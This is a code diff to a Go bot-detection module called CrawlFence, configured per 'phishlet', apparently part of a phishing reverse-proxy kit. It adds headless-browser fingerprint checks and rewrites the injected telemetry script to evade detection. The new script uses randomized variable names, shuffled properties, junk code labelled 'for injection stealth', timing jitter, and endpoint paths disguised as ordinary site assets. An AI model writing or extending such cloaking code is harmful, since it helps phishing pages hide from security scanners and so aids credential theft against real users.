@@ -4,6 +4,7 @@ import (
 	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
+	"math/rand"
 	"regexp"
 	"sort"
 	"strings"
@@ -38,18 +39,25 @@ type JA4Record struct {
 
 // TelemetryData from browser fp-collect
 type TelemetryData struct {
-	UserAgent   string   `json:"userAgent"`
-	WebDriver   bool     `json:"webdriver"`
-	Headless    bool     `json:"headless"`
-	Puppeteer   bool     `json:"puppeteer"`
-	Playwright  bool     `json:"playwright"`
-	Selenium    bool     `json:"selenium"`
-	PhantomJS   bool     `json:"phantomjs"`
-	Languages   []string `json:"languages"`
-	Platform    string   `json:"platform"`
-	Plugins     int      `json:"plugins"`
-	ScreenRes   string   `json:"screenRes"`
-	Timezone    string   `json:"timezone"`
+	UserAgent         string   `json:"userAgent"`
+	WebDriver         bool     `json:"webdriver"`
+	Headless          bool     `json:"headless"`
+	Puppeteer         bool     `json:"puppeteer"`
+	Playwright        bool     `json:"playwright"`
+	Selenium          bool     `json:"selenium"`
+	PhantomJS         bool     `json:"phantomjs"`
+	Languages         []string `json:"languages"`
+	Platform          string   `json:"platform"`
+	Plugins           int      `json:"plugins"`
+	ScreenRes         string   `json:"screenRes"`
+	Timezone          string   `json:"timezone"`
+	ChromePresent     bool     `json:"chromePresent"`
+	ConnectionPresent bool     `json:"connectionPresent"`
+	NotifPerm         string   `json:"notifPerm"`
+	Cores             int      `json:"cores"`
+	DeviceMem         float64  `json:"deviceMem"`
+	CanvasHash        string   `json:"canvasHash"`
+	OuterSize         string   `json:"outerSize"`
 }
 
 // CrawlfenceConfig per-phishlet configuration
@@ -75,12 +83,15 @@ type CrawlfenceTelemetryConfig struct {
 
 // CrawlFence main structure for bot detection
 type CrawlFence struct {
-	ja4Records    map[string]*JA4Record // JA4 signature -> record
-	ja4Mtx        sync.RWMutex
-	sessionJA4    map[string]string // session_id -> JA4 signature
-	sessionJA4Mtx sync.RWMutex
-	ipJA4         map[string]string // IP -> last JA4 signature
-	ipJA4Mtx      sync.RWMutex
+	ja4Records      map[string]*JA4Record // JA4 signature -> record
+	ja4Mtx          sync.RWMutex
+	sessionJA4      map[string]string // session_id -> JA4 signature
+	sessionJA4Mtx   sync.RWMutex
+	ipJA4           map[string]string // IP -> last JA4 signature
+	ipJA4Mtx        sync.RWMutex
+	endpointToSid   map[string]string // endpoint_path -> session_id
+	sidToEndpoint   map[string]string // session_id -> endpoint_path
+	endpointMtx     sync.RWMutex
 }
 
 // Built-in automation detection patterns (not configurable)
@@ -124,9 +135,11 @@ var DefaultUABlacklist = []string{
 // NewCrawlFence creates a new CrawlFence instance
 func NewCrawlFence() *CrawlFence {
 	return &CrawlFence{
-		ja4Records: make(map[string]*JA4Record),
-		sessionJA4: make(map[string]string),
-		ipJA4:      make(map[string]string),
+		ja4Records:    make(map[string]*JA4Record),
+		sessionJA4:    make(map[string]string),
+		ipJA4:         make(map[string]string),
+		endpointToSid: make(map[string]string),
+		sidToEndpoint: make(map[string]string),
 	}
 }
 
@@ -405,6 +418,36 @@ func (cf *CrawlFence) CheckTelemetry(cfgTelemetry *CrawlfenceTelemetryConfig, da
 		return false, "phantomjs detected"
 	}
 
+	// Check window.chrome presence (missing in headless Chrome)
+	if !data.ChromePresent && strings.Contains(data.UserAgent, "Chrome") {
+		return false, "window.chrome missing in Chrome UA"
+	}
+
+	// Check navigator.connection presence (missing in many bots)
+	if !data.ConnectionPresent && strings.Contains(data.UserAgent, "Chrome") {
+		return false, "navigator.connection missing"
+	}
+
+	// Check Notification.permission (headless defaults to "denied")
+	if data.NotifPerm == "denied" && data.Headless {
+		return false, "notification permission denied in headless"
+	}
+
+	// Check hardwareConcurrency (0 or absent in bots)
+	if data.Cores == 0 {
+		return false, "hardwareConcurrency is 0"
+	}
+
+	// Check deviceMemory (0 or absent in bots)
+	if data.DeviceMem == 0 && strings.Contains(data.UserAgent, "Chrome") {
+		return false, "deviceMemory missing in Chrome UA"
+	}
+
+	// Check outerWidth/outerHeight (0x0 in headless)
+	if data.OuterSize == "0x0" {
+		return false, "outer window size is 0x0"
+	}
+
 	// Check built-in automation indicators in user agent
 	for _, indicator := range AutomationIndicators {
 		if strings.Contains(data.UserAgent, indicator) {
@@ -500,6 +543,86 @@ func (cf *CrawlFence) ClearJA4Stats(phishlet string) {
 	}
 }
 
+// randomHex returns a random hex string of n bytes
+func randomHex(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = byte(rand.Intn(256))
+	}
+	return hex.EncodeToString(b)
+}
+
+// randomVarName generates a random JS-safe variable name
+func randomVarName() string {
+	prefixes := []string{"_", "$"}
+	prefix := prefixes[rand.Intn(len(prefixes))]
+	return prefix + randomHex(3)
+}
+
+// randomEndpointPath generates a path that looks like a legitimate resource
+func randomEndpointPath() string {
+	templates := []struct {
+		format string
+		ext    string
+	}{
+		{"/assets/js/%s.js", ""},
+		{"/static/img/%s.gif", ""},
+		{"/api/v1/telemetry/%s", ""},
+		{"/cdn-cgi/scripts/%s.js", ""},
+		{"/wp-content/themes/%s.css", ""},
+		{"/res/%s.png", ""},
+		{"/static/chunk/%s.js", ""},
+	}
+	t := templates[rand.Intn(len(templates))]
+	return fmt.Sprintf(t.format, randomHex(8))
+}
+
+// GetOrCreateEndpoint returns the endpoint path for a session, creating one if needed
+func (cf *CrawlFence) GetOrCreateEndpoint(sessionId string) string {
+	cf.endpointMtx.Lock()
+	defer cf.endpointMtx.Unlock()
+
+	if ep, ok := cf.sidToEndpoint[sessionId]; ok {
+		return ep
+	}
+
+	ep := randomEndpointPath()
+	cf.sidToEndpoint[sessionId] = ep
+	cf.endpointToSid[ep] = sessionId
+	return ep
+}
+
+// LookupEndpoint returns the session ID for an endpoint path, or empty string
+func (cf *CrawlFence) LookupEndpoint(path string) string {
+	cf.endpointMtx.RLock()
+	defer cf.endpointMtx.RUnlock()
+	return cf.endpointToSid[path]
+}
+
+// RemoveEndpoint cleans up endpoint mapping for a session
+func (cf *CrawlFence) RemoveEndpoint(sessionId string) {
+	cf.endpointMtx.Lock()
+	defer cf.endpointMtx.Unlock()
+
+	if ep, ok := cf.sidToEndpoint[sessionId]; ok {
+		delete(cf.endpointToSid, ep)
+		delete(cf.sidToEndpoint, sessionId)
+	}
+}
+
+// generateRandomJunkCode generates random junk JS code for injection stealth
+func generateRandomJunkCode() string {
+	fnName := randomVarName()
+	varName := randomVarName()
+	ops := []string{
+		fmt.Sprintf("var %s=%d;", varName, rand.Intn(9999)),
+		fmt.Sprintf("var %s='%s';", varName, randomHex(4)),
+		fmt.Sprintf("var %s=Date.now()%%1000;", varName),
+	}
+	body := ops[rand.Intn(len(ops))]
+	return fmt.Sprintf("function %s(){%s};", fnName, body)
+}
+
 // CompileTelemetryPatterns compiles UA blacklist regex patterns
 func CompileTelemetryPatterns(patterns []string) []*regexp.Regexp {
 	var compiled []*regexp.Regexp
@@ -512,29 +635,89 @@ func CompileTelemetryPatterns(patterns []string) []*regexp.Regexp {
 }
 
 // GenerateCrawlfenceScript returns JavaScript for browser telemetry collection
-func GenerateCrawlfenceScript(sessionId string) string {
-	return fmt.Sprintf(`<script>
+// with randomized variable names, property order, timing, and endpoint path
+func GenerateCrawlfenceScript(cf *CrawlFence, sessionId string) string {
+	endpoint := cf.GetOrCreateEndpoint(sessionId)
+
+	// Randomized variable names
+	dataVar := randomVarName()
+	canvasVar := randomVarName()
+	ctxVar := randomVarName()
+	sendVar := randomVarName()
+
+	// Build telemetry property assignments in random order
+	type prop struct {
+		key string
+		val string
+	}
+	props := []prop{
+		{"userAgent", "navigator.userAgent||''"},
+		{"webdriver", "!!navigator.webdriver"},
+		{"headless", "(/HeadlessChrome/.test(navigator.userAgent)||window.navigator.webdriver===true)"},
+		{"languages", "navigator.languages||[navigator.language]"},
+		{"platform", "navigator.platform||''"},
+		{"plugins", "(navigator.plugins?navigator.plugins.length:0)"},
+		{"screenRes", "(screen.width||0)+'x'+(screen.height||0)"},
+		{"timezone", "(Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'')"},
+		{"puppeteer", "!!(window.__puppeteer_evaluation_script__||window.__PUPPETEER_BINDING)"},
+		{"playwright", "!!window.__playwright"},
+		{"selenium", "!!(window._selenium||window.callSelenium||document.__selenium_evaluate||document.__selenium_unwrapped||window.__webdriver_script_fn)"},
+		{"phantomjs", "!!(window.callPhantom||window._phantom)"},
+		{"chromePresent", "!!window.chrome"},
+		{"connectionPresent", "!!navigator.connection"},
+		{"notifPerm", "(typeof Notification!=='undefined'?Notification.permission:'unsupported')"},
+		{"cores", "(navigator.hardwareConcurrency||0)"},
+		{"deviceMem", "(navigator.deviceMemory||0)"},
+		{"outerSize", "(window.outerWidth||0)+'x'+(window.outerHeight||0)"},
+	}
+
+	// Shuffle property order
+	rand.Shuffle(len(props), func(i, j int) { props[i], props[j] = props[j], props[i] })
+
+	// Build object assignments
+	var propLines []string
+	for _, p := range props {
+		propLines = append(propLines, fmt.Sprintf("%s['%s']=%s;", dataVar, p.key, p.val))
+	}
+
+	// Canvas fingerprint (generates a hash from canvas rendering)
+	canvasCode := fmt.Sprintf(`try{var %s=document.createElement('canvas');%s.width=200;%s.height=50;var %s=%s.getContext('2d');%s.textBaseline='top';%s.font='14px Arial';%s.fillText('cwl',2,2);%s['canvasHash']=%s.toDataURL().slice(-32);}catch(e){%s['canvasHash']='';}`,
+		canvasVar, canvasVar, canvasVar, ctxVar, canvasVar, ctxVar, ctxVar, ctxVar, dataVar, canvasVar, dataVar)
+
+	// Random jitter delay (100-2000ms)
+	jitter := 100 + rand.Intn(1900)
+
+	// Randomize between fetch and XMLHttpRequest
+	var sendCode string
+	if rand.Intn(2) == 0 {
+		// fetch variant
+		sendCode = fmt.Sprintf(`var %s=function(){fetch('%s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(%s)}).catch(function(){});};`,
+			sendVar, endpoint, dataVar)
+	} else {
+		// XHR variant
+		xhrVar := randomVarName()
+		sendCode = fmt.Sprintf(`var %s=function(){var %s=new XMLHttpRequest();%s.open('POST','%s',true);%s.setRequestHeader('Content-Type','application/json');%s.send(JSON.stringify(%s));};`,
+			sendVar, xhrVar, xhrVar, endpoint, xhrVar, xhrVar, dataVar)
+	}
+
+	script := fmt.Sprintf(`<script>
 (function(){
 try{
-var d={
-userAgent:navigator.userAgent||'',
-webdriver:!!navigator.webdriver,
-headless:(/HeadlessChrome/.test(navigator.userAgent)||window.navigator.webdriver===true),
-languages:navigator.languages||[navigator.language],
-platform:navigator.platform||'',
-plugins:(navigator.plugins?navigator.plugins.length:0),
-screenRes:(screen.width||0)+'x'+(screen.height||0),
-timezone:(Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'')
-};
-d.puppeteer=!!(window.__puppeteer_evaluation_script__||window.__PUPPETEER_BINDING);
-d.playwright=!!window.__playwright;
-d.selenium=!!(window._selenium||window.callSelenium||document.__selenium_evaluate||document.__selenium_unwrapped||window.__webdriver_script_fn);
-d.phantomjs=!!(window.callPhantom||window._phantom);
-var x=new XMLHttpRequest();
-x.open('POST','/cf/%s',true);
-x.setRequestHeader('Content-Type','application/json');
-x.send(JSON.stringify(d));
+var %s={};
+%s
+%s
+%s
+setTimeout(%s,%d);
 }catch(e){}
 })();
-</script>`, sessionId)
+</script>`,
+		dataVar,
+		strings.Join(propLines, "\n"),
+		canvasCode,
+		sendCode,
+		sendVar,
+		jitter,
+	)
+
+	return script
 }
